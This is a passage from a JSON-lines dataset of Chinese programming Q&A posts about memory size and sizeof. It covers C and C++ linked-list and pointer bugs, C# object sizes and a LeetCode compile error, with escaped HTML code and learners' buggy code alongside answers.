return p-&amp;gt;Length;\n}\n \nint GetElem(LinkList * L , int i, ElemType *e){   &lt;span class=\"hljs-regexp\"&gt;//&lt;/span&gt;读取单链表中第i个值\n    int j;\n    LinkList * p;     &lt;span class=\"hljs-regexp\"&gt;//&lt;/span&gt;声明一节点p\n    p &amp;#61; L -&amp;gt; &lt;span class=\"hljs-keyword\"&gt;next&lt;/span&gt;;  &lt;span class=\"hljs-regexp\"&gt;//&lt;/span&gt;让p指向L的第一个节点\n    j &amp;#61; &lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;;          &lt;span class=\"hljs-regexp\"&gt;//&lt;/span&gt;j为计数器\n    &lt;span class=\"hljs-keyword\"&gt;while&lt;/span&gt; (p &amp;amp;&amp;amp; j &amp;lt; i){     &lt;span class=\"hljs-regexp\"&gt;//&lt;/span&gt;p不为空 或者计数器j还没有等于i时&amp;#xff0c;循环继续\n        p &amp;#61; p -&amp;gt;&lt;span class=\"hljs-keyword\"&gt;next&lt;/span&gt;;       &lt;span class=\"hljs-regexp\"&gt;//&lt;/span&gt;让p指向下一个节点\n        &amp;#43;&amp;#43;j;\n    }\n    &lt;span class=\"hljs-keyword\"&gt;if&lt;/span&gt;(!p || j &amp;gt; i){        &lt;span class=\"hljs-regexp\"&gt;//&lt;/span&gt;如果p为空&amp;#xff0c;或者j大于i时&amp;#xff0c;循环结束\n        return ERROR;           &lt;span class=\"hljs-regexp\"&gt;//i&lt;/span&gt;元素不存在\n    }\n    *e &amp;#61; p-&amp;gt;data;           &lt;span class=\"hljs-regexp\"&gt;//&lt;/span&gt;取第i个元素的数据\n \n    return OK;\n}\n \nint ListInsert(LinkList *L , int i , ElemType e){   &lt;span class=\"hljs-regexp\"&gt;//&lt;/span&gt;在L中第i个位置之前插入新的数据元素e &amp;#xff0c;L的长度加&lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;\n    int j;\n    LinkList *p ,* s;\n    p &amp;#61; L;\n    j &amp;#61; &lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;;\n    &lt;span class=\"hljs-keyword\"&gt;while&lt;/span&gt; (p &amp;amp;&amp;amp; j &amp;lt; i){     &lt;span class=\"hljs-regexp\"&gt;//&lt;/span&gt;寻找第i个节点\n        p &amp;#61; p -&amp;gt; &lt;span class=\"hljs-keyword\"&gt;next&lt;/span&gt;;\n        &amp;#43;&amp;#43;j;\n        p-&amp;gt;Length&amp;#43;&amp;#43;;\n    }\n    &lt;span class=\"hljs-keyword\"&gt;if&lt;/span&gt;(!p || j &amp;gt; i){\n        return ERROR;   &lt;span class=\"hljs-regexp\"&gt;//&lt;/span&gt;第i个元素不存在\n    }\n    s &amp;#61; (LinkList *) malloc(sizeof(Node));        &lt;span class=\"hljs-regexp\"&gt;//&lt;/span&gt;生成新节点\n    s-&amp;gt;data &amp;#61; e;        &lt;span class=\"hljs-regexp\"&gt;//&lt;/span&gt;将e的数据加入s中\n    s-&amp;gt;&lt;span class=\"hljs-keyword\"&gt;next&lt;/span&gt; &amp;#61; p -&amp;gt; &lt;span class=\"hljs-keyword\"&gt;next&lt;/span&gt;;        &lt;span class=\"hljs-regexp\"&gt;//&lt;/span&gt;将p的后继赋值给s的后继\n    p-&amp;gt;&lt;span class=\"hljs-keyword\"&gt;next&lt;/span&gt; &amp;#61; s;            &lt;span class=\"hljs-regexp\"&gt;//&lt;/span&gt;将s赋值给p的后继\n}\n \nint DaleteList(LinkList *L , int i , ElemType *e){      &lt;span class=\"hljs-regexp\"&gt;//&lt;/span&gt;删除第i个元素&amp;#xff0c;L的长度减&lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;\n    int j;\n    LinkList *p ,  *q;\n    p &amp;#61; L;\n    j &amp;#61; &lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;;\n    &lt;span class=\"hljs-keyword\"&gt;while&lt;/span&gt;(p &amp;amp;&amp;amp; j &amp;lt; i){      &lt;span class=\"hljs-regexp\"&gt;//&lt;/span&gt;寻找第i个节点\n        p &amp;#61; p-&amp;gt;&lt;span class=\"hljs-keyword\"&gt;next&lt;/span&gt;;\n        &amp;#43;&amp;#43;j;\n    }\n    &lt;span class=\"hljs-keyword\"&gt;if&lt;/span&gt;(!p || j &amp;gt; i){\n        return ERROR;       &lt;span class=\"hljs-regexp\"&gt;//&lt;/span&gt;第i个元素不存在\n    }\n    q &amp;#61; p-&amp;gt;&lt;span class=\"hljs-keyword\"&gt;next&lt;/span&gt;;        &lt;span class=\"hljs-regexp\"&gt;//&lt;/span&gt;将p的后继赋值给q\n    p -&amp;gt;&lt;span class=\"hljs-keyword\"&gt;next&lt;/span&gt; &amp;#61; p-&amp;gt;&lt;span class=\"hljs-keyword\"&gt;next&lt;/span&gt;-&amp;gt;&lt;span class=\"hljs-keyword\"&gt;next&lt;/span&gt;;   &lt;span class=\"hljs-regexp\"&gt;//&lt;/span&gt;将q的后继赋值给p的后继&amp;#xff0c;相当于p-&amp;gt;&lt;span class=\"hljs-keyword\"&gt;next&lt;/span&gt;-&amp;gt;&lt;span class=\"hljs-keyword\"&gt;next&lt;/span&gt;\n    *e &amp;#61; q-&amp;gt;data;           &lt;span class=\"hljs-regexp\"&gt;//&lt;/span&gt;将d的data赋值给e\n    free(q);                &lt;span class=\"hljs-regexp\"&gt;//&lt;/span&gt;释放节点q\n \n    return OK;\n}\n \nLinkList  * CreateList(int n ,LinkList  *L) {    &lt;span class=\"hljs-regexp\"&gt;//&lt;/span&gt;尾插法创建链表\n    LinkList *p , *r;         &lt;span class=\"hljs-regexp\"&gt;//&lt;/span&gt;r为节点最终的指针&amp;#xff0c;p为接收的节点\n    int i,k ;\n    srand(time(&lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;));\n    L&amp;#61; (Node * ) malloc(sizeof(Node));&lt;span class=\"hljs-regexp\"&gt;//&lt;/span&gt;为整个链表\n    (L)-&amp;gt;&lt;span class=\"hljs-keyword\"&gt;next&lt;/span&gt; &amp;#61; NULL;\n    &lt;span class=\"hljs-regexp\"&gt;//&lt;/span&gt;cout&amp;lt;&amp;lt;&lt;span class=\"hljs-string\"&gt;&amp;#34;L&amp;#61;&amp;#34;&lt;/span&gt;&amp;lt;&amp;lt;L&amp;lt;&amp;lt;endl;\n  \n    r&amp;#61; L;          &lt;span class=\"hljs-regexp\"&gt;//&lt;/span&gt;r为指向尾部的节点\n    &lt;span class=\"hljs-keyword\"&gt;for&lt;/span&gt;(i &amp;#61; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt; ; i &amp;lt; n; i&amp;#43;&amp;#43; ){\n        cin &amp;gt;&amp;gt; k;       &lt;span class=\"hljs-regexp\"&gt;//&lt;/span&gt;输入数值\n        p &amp;#61; (Node*) malloc(sizeof(Node));   &lt;span class=\"hljs-regexp\"&gt;//&lt;/span&gt;生成新节点\n        p -&amp;gt; data &amp;#61; k;      &lt;span class=\"hljs-regexp\"&gt;//&lt;/span&gt;将数值赋值入p\n        &lt;span class=\"hljs-regexp\"&gt;//&lt;/span&gt;cout&amp;lt;&amp;lt;&lt;span class=\"hljs-string\"&gt;&amp;#34;p-&amp;gt;data&amp;#61;&amp;#34;&lt;/span&gt;&amp;lt;&amp;lt;p-&amp;gt;data&amp;lt;&amp;lt;&lt;span class=\"hljs-string\"&gt;&amp;#34;,p&amp;#61;&amp;#34;&lt;/span&gt;&amp;lt;&amp;lt;p&amp;lt;&amp;lt;endl;\n        r-&amp;gt;&lt;span class=\"hljs-keyword\"&gt;next&lt;/span&gt; &amp;#61; p;        &lt;span class=\"hljs-regexp\"&gt;//&lt;/span&gt;将表尾终端节点的指针指向新节点\n        r &amp;#61; p;&lt;span class=\"hljs-regexp\"&gt;//&lt;/span&gt;将当前的新节点定义为表尾终端节点\n        p-&amp;gt;Length&amp;#43;&amp;#43;;\n       &lt;span class=\"hljs-regexp\"&gt;//&lt;/span&gt; cout&amp;lt;&amp;lt;p&amp;lt;&amp;lt;&lt;span class=\"hljs-string\"&gt;&amp;#34;,&amp;#34;&lt;/span&gt;&amp;lt;&amp;lt;p-&amp;gt;data&amp;lt;&amp;lt;endl;\n    }\n  &lt;span class=\"hljs-regexp\"&gt;//&lt;/span&gt;  &lt;span class=\"hljs-keyword\"&gt;delete&lt;/span&gt; L;\n    r -&amp;gt; &lt;span class=\"hljs-keyword\"&gt;next&lt;/span&gt; &amp;#61; NULL;       &lt;span class=\"hljs-regexp\"&gt;//&lt;/span&gt;表示当前链表结束\n     \n     return L;\n}\n \n \n \n \nvoid show(LinkList * L){         &lt;span class=\"hljs-regexp\"&gt;//&lt;/span&gt;打印整个链表\n&lt;span class=\"hljs-regexp\"&gt;//&lt;/span&gt;    cout&amp;lt;&amp;lt;&lt;span class=\"hljs-string\"&gt;&amp;#34;L&amp;#61;&amp;#34;&lt;/span&gt;&amp;lt;&amp;lt;L&amp;lt;&amp;lt;&lt;span class=\"hljs-string\"&gt;&amp;#34;&amp;#xff0c;L-&amp;gt;data&amp;#61;&amp;#34;&lt;/span&gt;&amp;lt;&amp;lt;L-&amp;gt;data&amp;lt;&amp;lt;endl;\n&lt;span class=\"hljs-regexp\"&gt;//&lt;/span&gt;    cout&amp;lt;&amp;lt;&lt;span class=\"hljs-string\"&gt;&amp;#34;1&amp;#34;&lt;/span&gt;&amp;lt;&amp;lt;endl;\n    LinkList * p &amp;#61;L-&amp;gt;&lt;span class=\"hljs-keyword\"&gt;next&lt;/span&gt;;\n  &lt;span class=\"hljs-regexp\"&gt;//&lt;/span&gt;  cout&amp;lt;&amp;lt;&lt;span class=\"hljs-string\"&gt;&amp;#34;2&amp;#34;&lt;/span&gt;&amp;lt;&amp;lt;endl;\n   &lt;span class=\"hljs-regexp\"&gt;//&lt;/span&gt; &lt;span class=\"hljs-keyword\"&gt;for&lt;/span&gt;(int i &amp;#61; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;;i &amp;lt; LengList(L);i&amp;#43;&amp;#43;){\n        &lt;span class=\"hljs-keyword\"&gt;while&lt;/span&gt;(p!&amp;#61;NULL){\n            cout&amp;lt;&amp;lt;&lt;span class=\"hljs-string\"&gt;&amp;#34;打印节点&amp;#34;&lt;/span&gt;&amp;lt;&amp;lt;endl;\n            cout &amp;lt;&amp;lt; p-&amp;gt;data &amp;lt;&amp;lt; endl;\n            p&amp;#61;p-&amp;gt;&lt;span class=\"hljs-keyword\"&gt;next&lt;/span&gt;;\n        }\n   &lt;span class=\"hljs-regexp\"&gt;//&lt;/span&gt; }\n}\n \n \nint ClearList(LinkList *L){     &lt;span class=\"hljs-regexp\"&gt;//&lt;/span&gt;将L重置为空表\n    LinkList * p ,* q;\n    p &amp;#61; (L)-&amp;gt;&lt;span class=\"hljs-keyword\"&gt;next&lt;/span&gt;;     &lt;span class=\"hljs-regexp\"&gt;//&lt;/span&gt;*p指向第一个节点\n    &lt;span class=\"hljs-keyword\"&gt;while&lt;/span&gt; (p){          &lt;span class=\"hljs-regexp\"&gt;//&lt;/span&gt;没到表尾\n        q &amp;#61; p-&amp;gt; &lt;span class=\"hljs-keyword\"&gt;next&lt;/span&gt;;\n        free(p);\n        p &amp;#61; q;\n    }\n    (L)-&amp;gt;&lt;span class=\"hljs-keyword\"&gt;next&lt;/span&gt; &amp;#61; NULL;      &lt;span class=\"hljs-regexp\"&gt;//&lt;/span&gt;头指针指针域为空\n    return OK;\n}\n \nint main(){\n    LinkList * L;\n    int n;\n  &lt;span class=\"hljs-regexp\"&gt;//&lt;/span&gt;  InitList(L);\n&lt;span class=\"hljs-regexp\"&gt;//&lt;/span&gt;    cout &amp;lt;&amp;lt; &lt;span class=\"hljs-string\"&gt;&amp;#34;链表已建立&amp;#34;&lt;/span&gt; &amp;lt;&amp;lt; endl;\n    cout &amp;lt;&amp;lt; &lt;span class=\"hljs-string\"&gt;&amp;#34;请输入内容&amp;#34;&lt;/span&gt; &amp;lt;&amp;lt; endl;\n    cin &amp;gt;&amp;gt; n;\n    L&amp;#61;CreateList(n,L);\n    cout &amp;lt;&amp;lt; &lt;span class=\"hljs-string\"&gt;&amp;#34;链表已建立&amp;#34;&lt;/span&gt; &amp;lt;&amp;lt; endl;\n  &lt;span class=\"hljs-regexp\"&gt;//&lt;/span&gt;  cout&amp;lt;&amp;lt;L;\n    show(L);\n &lt;span class=\"hljs-regexp\"&gt;//&lt;/span&gt;   &lt;span class=\"hljs-keyword\"&gt;delete&lt;/span&gt; L;\n \n\n \n}\n \n \n \n&lt;/code&gt;&lt;/pre&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["C++单链表 内存溢出问题请问如何解决", ["我申请单链表的一段空间，但是给了警报", "\n", "\n", "我想请问一下有什么问题吗？附上整个代码", "\n", "#include <iostream>", "\nusing namespace std;\n", "#include <string>", "\n", "#define OK 1", "\n", "#define ERROR 0", "\n\ntypedef int ElemType;\ntypedef struct Node{\n    ElemType data;\n    struct Node *", "next", ";\n    int Length = ", "0", ";\n}Node;\ntypedef struct Node *LinkList;\n\n", "//", "void InitList(LinkList *L){  ", "//", "初始化 表长设为", "0", "\n", "//", "    LinkList p;\n", "//", "    p->Length = ", "0", ";\n", "//", "}\n\nint LengList(LinkList *L){\n    LinkList p;\n    return p->Length;\n}\n\nint GetElem(LinkList L , int i, ElemType *e){   ", "//", "读取单链表中第i个值\n    int j;\n    LinkList p;     ", "//", "声明一节点p\n    p = L -> ", "next", ";  ", "//", "让p指向L的第一个节点\n    j = ", "1", ";          ", "//", "j为计数器\n    ", "while", " (p && j < i){     ", "//", "p不为空 或者计数器j还没有等于i时，循环继续\n        p = p ->", "next", ";       ", "//", "让p指向下一个节点\n        ++j;\n    }\n    ", "if", "(!p || j > i){        ", "//", "如果p为空，或者j大于i时，循环结束\n        return ERROR;           ", "//i", "元素不存在\n    }\n    *e = p->data;           ", "//", "取第i个元素的数据\n\n    return OK;\n}\n\nint ListInsert(LinkList *L , int i , ElemType e){   ", "//", "在L中第i个位置之前插入新的数据元素e ，L的长度加", "1", "\n    int j;\n    LinkList p , s;\n    p = *L;\n    j = ", "1", ";\n    ", "while", " (p && j < i){     ", "//", "寻找第i个节点\n        p = p -> ", "next", ";\n        ++j;\n        p->Length++;\n    }\n    ", "if", "(!p || j > i){\n        return ERROR;   ", "//", "第i个元素不存在\n    }\n    s = (LinkList) malloc(sizeof(Node));        ", "//", "生成新节点\n    s->data = e;        ", "//", "将e的数据加入s中\n    s->", "next", " = p -> ", "next", ";        ", "//", "将p的后继赋值给s的后继\n    p->", "next", " = s;            ", "//", "将s赋值给p的后继\n}\n\nint DaleteList(LinkList *L , int i , ElemType *e){      ", "//", "删除第i个元素，L的长度减", "1", "\n    int j;\n    LinkList p , q;\n    p = *L;\n    j = ", "1", ";\n    ", "while", "(p && j < i){      ", "//", "寻找第i个节点\n        p = p->", "next", ";\n        ++j;\n    }\n    ", "if", "(!p || j > i){\n        return ERROR;       ", "//", "第i个元素不存在\n    }\n    q = p->", "next", ";        ", "//", "将p的后继赋值给q\n    p ->", "next", " = p->", "next", "->", "next", ";   ", "//", "将q的后继赋值给p的后继，相当于p->", "next", "->", "next", "\n    *e = q->data;           ", "//", "将d的data赋值给e\n    free(q);                ", "//", "释放节点q\n\n    return OK;\n}\n\nvoid CreateList(int n ,LinkList *L) {    ", "//", "尾插法创建链表\n    LinkList p , r;         ", "//", "r为节点最终的指针，p为接收的节点\n    int i ;\n    srand(time(", "0", "));\n    *L= (LinkList) malloc(sizeof(int));", "//", "为整个链表\n    (*L)->", "next", " = NULL;\n    r= *L;          ", "//", "r为指向尾部的节点\n    ", "for", "(i = ", "0", " ; i < n; i++ ){\n        cin >> i;       ", "//", "输入数值\n        p = (Node*) malloc(sizeof(Node));   ", "//", "生成新节点\n        p -> data = i;      ", "//", "将数值赋值入p\n        r->", "next", " = p;        ", "//", "将表尾终端节点的指针指向新节点\n        r = p;", "//", "将当前的新节点定义为表尾终端节点\n        p->Length++;\n    }\n    ", "delete", " L;\n    r -> ", "next", " = NULL;       ", "//", "表示当前链表结束\n\n}\n\n\n\n\nvoid show(LinkList *L){         ", "//", "打印整个链表\n    LinkList p ;\n    ", "for", "(int i = ", "0", ";i < LengList(L);i++){\n        cout << p-> ", "next", "->data << endl;\n    }\n}\n\n\nint ClearList(LinkList *L){     ", "//", "将L重置为空表\n    LinkList p , q;\n    p = (*L)->", "next", ";     ", "//", "*p指向第一个节点\n    ", "while", " (p){          ", "//", "没到表尾\n        q = p-> ", "next", ";\n        free(p);\n        p = q;\n    }\n    (*L)->", "next", " = NULL;      ", "//", "头指针指针域为空\n    return OK;\n}\n\nint main(){\n    LinkList* L;\n    int n;\n", "//", "    InitList(L);\n    ", "//", "cout << ", "\"链表已建立\"", " << endl;\n    cout << ", "\"请输入内容\"", " << endl;\n    cin >> n;\n    CreateList(n,L);\n    cout << ", "\"链表已建立\"", " << endl;\n    show(L);\n    ", "delete", " L;\n\n}\n\n\n\n"]], "Tag": "程序设计"}
{"Answer": "C# 能否获取一个对象所占内存的大小？\r\n    今日，在项目重构的时候忽然想到一个问题，一个类哪些成员的增加，会影响一个类所占内存的大小？C#有没有办法知道一个对象占多少内存呢？\r\n\r\n     第一个问题：很快想到是类的非静态的字段、属性。\r\n\r\n     第二个问题：首先想到的是sizeof（）。\r\n\r\n下面开始验证，首先来验证值类型，验证代码如下：\r\n\r\nint size = sizeof (int); //4个字节\r\n注意点：sizeof 运算符仅适用于值类型，而不适用于引用类型。sizeof 运算符只能在不安全代码块中使用。如下面的代码将无法编译通过：\r\n\r\npublic struct TestStuct\r\n    {\r\n\r\n    }\r\n\r\nint size = sizeof(new TestStuct());\r\n编译后，提示：\r\n\r\n错误 1 “ConsoleApplication3.TestStuct”没有预定义的大小，因此 sizeof 只能在不安全的上下文中使用(请考虑使用 System.Runtime.InteropServices.Marshal.SizeOf) \r\n\r\n修改为Marshal.SizeOf方法，改方法返回对象的非托管大小（以字节为单位）。参数可以是引用类型或装箱的值类型。布局必须是连续的或显式的。\r\n\r\nint size = Marshal.SizeOf(new TestStuct()); //1个字节\r\n接下来来验证引用类型：\r\n\r\n由于不能作为非托管结构进行封送处理；无法计算有意义的大小或偏移量。所有下面的代码在运行的时候，会抛出异常。\r\n\r\n public class Student\r\n    {\r\n    }\r\n\r\n int size = Marshal.SizeOf(new Student());\r\n需要给Student类，加上一个StructLayoutAttribute，来控制Student类的数据字段的物理布局。修改代码为：\r\n\r\n [StructLayout(LayoutKind.Sequential)]\r\n    public class Student\r\n    {\r\n    }\r\n\r\nint size = Marshal.SizeOf(new Student()); //1个字节\r\nLayoutKind 默认值为Auto.\r\n\r\n结论：\r\n1：对于托管对象是没有办法直接获取到一个对象所占的内存大小。\r\n2：非托管对象，可以使用Marshal.SizeOf\r\n3：对内置类型，如int,long,byte等使用sizeof\r\n\r\n扩展：\r\n有人提出使用二进制序列化，将一个对象序列化成一个MemoryStream,然后返回MemoryStream.Length,经过验证是不可以的。\r\n\r\n验证代码如下：\r\n\r\n复制代码\r\n[Serializable]\r\n public class Student\r\n    {\r\n    }\r\n\r\nprivate static long GetObjectSize(object o)\r\n        {\r\n            using (var stream = new MemoryStream())\r\n            {\r\n                var formatter = new BinaryFormatter();\r\n                formatter.Serialize(stream, o);\r\n                using (var fileStream = new FileStream(@\"D:\\Student.txt\", FileMode.OpenOrCreate, FileAccess.Write))\r\n                {\r\n                    var buffer = stream.ToArray();\r\n                    fileStream.Write(buffer, 0, buffer.Length);\r\n                    fileStream.Flush();\r\n                }\r\n\r\n                return stream.Length;\r\n            }\r\n        }\r\n\r\n var student = new Student();\r\n long size = GetObjectSize(student);  //139个字节\r\n复制代码\r\nStudent.txt保存的文本信息如下所示，通过文本信息，可以得知多出来的100多个字节，估计是就是这一串字符串吧。\r\n\r\n \t   \t       \t\t   JConsoleApplication3, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null\t\t   \tConsoleApplication3.Student", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["C#中如何计算类占空间大小？？", ["C#中如何计算类占空间大小？？", "\n我用sizeof不行", "\n\n", "用using System.Runtime.InteropServices;的Marshal.SizeOf(p)报异常。"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;?运算符属于程序的一部分,不属于变量或者常量,所以没有和变量一样的占据内存概念&lt;br /&gt;运算符生成的机器指令在代码段是占内存的,这属于程序本身占据的空间,一般不回去考虑这一方面&lt;br /&gt;&lt;code class=\"language-javascript\"&gt;有帮助望采纳~&lt;/code&gt;&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["请问C++里可以查看到加减乘除运算符的字节大小吗", ["如标题", "尝试过sizeof，但是正如它所限制的那样，不行。还是说运算符根本不占内存啊？"]], "Tag": "程序设计"}
{"Answer": "&lt;div class=\"post-text\" itemprop=\"text\"&gt;\r\n&lt;p&gt;The following, valid in C and C++, is going to (most likely) result in different values in &lt;code&gt;i&lt;/code&gt; in C and C++:&lt;/p&gt;\n\n&lt;pre&gt;&lt;code&gt;int i = sizeof('a');\n&lt;/code&gt;&lt;/pre&gt;\n\n&lt;p&gt;See &lt;a href=\"https://stackoverflow.com/questions/2172943/size-of-character-a-in-c-c\"&gt;Size of character ('a') in C/C++&lt;/a&gt; for an explanation of the difference.&lt;/p&gt;\n\n&lt;p&gt;Another one from &lt;a href=\"http://david.tribble.com/text/cdiffs.htm\" rel=\"noreferrer\"&gt;this article&lt;/a&gt;:&lt;/p&gt;\n\n&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;\n\nint  sz = 80;\n\nint main(void)\n{\n    struct sz { char c; };\n\n    int val = sizeof(sz);      // sizeof(int) in C,\n                               // sizeof(struct sz) in C++\n    printf(\"%d\\n\", val);\n    return 0;\n}\n&lt;/code&gt;&lt;/pre&gt;\n    &lt;/div&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["在 c 和 c + + 中都有效的代码在用每种语言编译时会产生不同的行为吗？", ["\n\n", "C and C++ have many differences, and not all valid C code is valid C++ code.", "\n(By \"valid\" I mean standard code with defined behavior, i.e. not implementation-specific/undefined/etc.)", "\n\n", "Is there any scenario in which a piece of code valid in both C and C++ would produce ", "different", " behavior when compiled with a standard compiler in each language?", "\n\n", "To make it a reasonable/useful comparison (I'm trying to learn something practically useful, not to try to find obvious loopholes in the question), let's assume:", "\n\n", "\n", "Nothing preprocessor-related (which means no hacks with ", "#ifdef __cplusplus", ", pragmas, etc.)  ", "\n", "Anything implementation-defined is the same in both languages (e.g. numeric limits, etc.)", "\n", "We're comparing reasonably recent versions of each standard (e.g. say, C++98 and C90 or later)", "\nIf the versions matter, then please mention which versions of each produce different behavior.", "\n", "\n", "\n\n", "转载于:https://stackoverflow.com/questions/12887700/can-code-that-is-valid-in-both-c-and-c-produce-different-behavior-when-compile"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;不用再定义了啊&amp;#xff0c;函数参数就是了啊&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["C++力扣报错，如何解决？", ["力扣的题", "不知道为什么错了，求指点", "\n", "\n", "#define ", "GET_ARRAY_LEN(", "arr", ",", "len", ")", " {len = (sizeof(arr)", " / ", "sizeof(arr", "[", "0", "]", "));}\n\n", "class", " Solution {\npublic:\n    vector<", "bool", "> prefixes", "DivBy5(", "vector", "<", "int", ">& ", "nums", ")", " \n    {\n        ", "int", " i,j,x;\n        ", "GET_ARRAY_LEN(", "nums", ", ", "x", ")", ";\n        ", "//x=sizeof(nums);", "\n        vrctor<", "int", ">", "Nums(", "x", ",0)", ":\n        ", "for", "(i=", "0", ";i<X;i++)\n        {\n            ", "for", "(j=", "0", ";j<i;j++)\n            {\n                ", "if", "(nums", "[", "i", "]", ")\n                Nums", "[", "i", "]", "=Nums", "[", "i", "]", "+", "2", "e(i-j);\n            }\n            ", "if", "(Nums", "[", "i", "]", "%", "5", "==", "0", ")\n            Nums", "[", "i", "]", "=", "true", ";\n            esle\n            Nums", "[", "i", "]", "=", "false", ";\n            cout<<Nums", "[", "i", "]", ";\n        }\n        ", "while", "(", "1", ");\n    }\n};\n\n"]], "Tag": "程序设计"}
{"Answer": "int copyptr(char (*myp1)[30], int num1, char **myp2, int num2, char ***myp3, int *num3)\r\n{\r\n\tint i = 0, j = 0, k = 0;\r\n\tchar **p3 = NULL;\r\n\tp3 = (char **)malloc(sizeof(char *) * (num1 + num2));\r\n\tif (p3 == NULL)\r\n\t{\r\n\t\tprintf(\"copyptr() 分配p3二级指针内存失败\\n\");\r\n\t\treturn 1;//注意此时还没释放内存\r\n\t}\r\n\tif (myp1 == NULL || myp2 == NULL || myp3 == NULL || num3 == NULL)\r\n\t{\r\n\t\tprintf(\"参数传递出错\\n\");\r\n\t\treturn 2;\r\n\t}\r\n\tchar(*p1)[30] = myp1;\r\n\tchar **p2 = myp2;\r\n\t*num3 = num1 + num2;\r\n\tfor ( i = 0; i &lt; num1; i++)//拷贝第一种内存\r\n\t{\r\n\t\tk = strlen(p1[i])+1;\r\n\t\tp3[i] = (char *)malloc(sizeof(char)*k);\r\n\t\tstrcpy(p3[i], p1[i]);\r\n\t\tp3[i][k-1] = '\\0';//【注释】//将k改为k-1,长度为k，最后一个元素为k-1，前面释放未申请内存，故报错；\r\n\t}\r\n\tfor (j = 0; j &lt; num2; j++,i++)//拷贝第二种内存\r\n\t{\r\n\t\tk = strlen(p2[j]) + 1;\r\n\t\tp3[i] = (char *)malloc(sizeof(char)*k);\r\n\t\tstrcpy(p3[i], p2[j]);\r\n\t\tp3[i][k-1] = '\\0';//【注释】//将k改为k-1,长度为k，最后一个元素为k-1，前面释放未申请内存，故报错；\r\n\t}\r\n\tint ret = sort(p3, *num3);\r\n\tif (ret != 0)\r\n\t{\r\n\t\tprintf(\"sort() err\\n\");\r\n\t\treturn 3;\r\n\t}\r\n\t*myp3 = p3;\r\n\treturn 0;\r\n}", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["二级指针指向内存释放问题", ["/*要求：将二级指针第一种内存模型和第二种内存模型拷贝到第三种内存模型", "\nint copyptr(char (*myp1)[10],int ", "num1,char **myp2,int num2,char *", "*myp3,int ", "num3);", "/", "\n问题：释放malloc内存时程序当掉，原因不明", "\n程序当掉的地方在freep01(）函数那里，已标记开始当掉之处", "\n\n", "\n#include<stdio.h>\n#include<stdlib.h>\n#include<string.h>\n\nint sort(char **myp3, int num3)\n{\n    char **p = myp3;\n    char *tmp = NULL;\n    int i = 0, j = 0;\n    if (myp3 == NULL)\n    {\n        printf(\"sort() 函数参数传递出错\\n\");\n        return 1;\n    }\n    for (i=0; i < num3; i++)\n    {\n        for (j=i+1; j < num3; j++)//错误，需把内容复制而不是指针交换\n        {\n            if (strcmp(p[i], p[j]) > 0)\n            {\n                tmp = p[i];\n                p[i] = p[j];\n                p[j] = tmp;\n            }\n        }\n    }\n    return 0;\n}\nint copyptr(char (*myp1)[30], int num1, char **myp2, int num2, char ***myp3, int *num3)\n{\n    int i = 0, j = 0, k = 0;\n    char **p3 = NULL;\n    p3 = (char **)malloc(sizeof(char *) * (num1 + num2));\n    if (p3 == NULL)\n    {\n        printf(\"copyptr() 分配p3二级指针内存失败\\n\");\n        return 1;//注意此时还没释放内存\n    }\n    if (myp1 == NULL || myp2 == NULL || myp3 == NULL || num3 == NULL)\n    {\n        printf(\"参数传递出错\\n\");\n        return 2;\n    }\n    char(*p1)[30] = myp1;\n    char **p2 = myp2;\n    *num3 = num1 + num2;\n    for ( i = 0; i < num1; i++)//拷贝第一种内存\n    {\n        k = strlen(p1[i])+1;\n        p3[i] = (char *)malloc(sizeof(char)*k);\n        strcpy(p3[i], p1[i]);\n        p3[i][k] = '\\0';\n    }\n    for (j = 0; j < num2; j++,i++)//拷贝第二种内存\n    {\n        k = strlen(p2[j]) + 1;\n        p3[i] = (char *)malloc(sizeof(char)*k);\n        strcpy(p3[i], p2[j]);\n        p3[i][k] = '\\0';\n    }\n    int ret = sort(p3, *num3);\n    if (ret != 0)\n    {\n        printf(\"sort() err\\n\");\n        return 3;\n    }\n    *myp3 = p3;\n    return 0;\n}\n\nint freep01(char **myp, int num)\n{\n    char **p = myp;\n    if (myp == NULL)\n    {\n        return 1;\n    }\n    for (int i = 0; i < num; i++)\n    {\n        free(p[i]);//运行到这里程序当掉\n        p[i] = NULL;\n    }\n    free(p);\n    p = NULL;\n    return 0;\n}\nint freep02(char ***myp, int num)\n{\n    char **p = *myp;\n    if (myp == NULL)\n    {\n        return 1;\n    }\n    for (int i = 0; i < num; i++)\n    {\n        free(p[i]);\n        p[i] = NULL;\n    }\n    free(p);\n    p = NULL;\n    return 0;\n}\nvoid main()\n{\n    char p1[][30] = { \"aaaaaa\",\"bbbbb\",\"ccccccc\" };\n    char *p2[] = { \"1111\",\"222222\",\"33333333\"};\n    char **p3 = NULL;\n    int len1 = sizeof(p1) / sizeof(p1[0]);\n    int len2 = sizeof(p2) / sizeof(p2[1]);\n    int len3 = 0;\n    int ret = copyptr(p1, len1, p2, len2, &p3, &len3);\n    if (ret != 0)\n    {\n        printf(\"copyptr() err\\n\");\n        return;\n    }\n    for (int i = 0; i < len3; i++)\n    {\n        printf(\"%s\\n\", p3[i]);\n    }\n    printf(\"总共%d个字符串\\n\", len3);\n\n    ret = freep01(p3, len3);\n    if (ret != 0)\n    {\n        printf(\"freep01() err\\n\");\n        return;\n    }\n\n}\n\n", "\n\n"]], "Tag": "程序设计"}
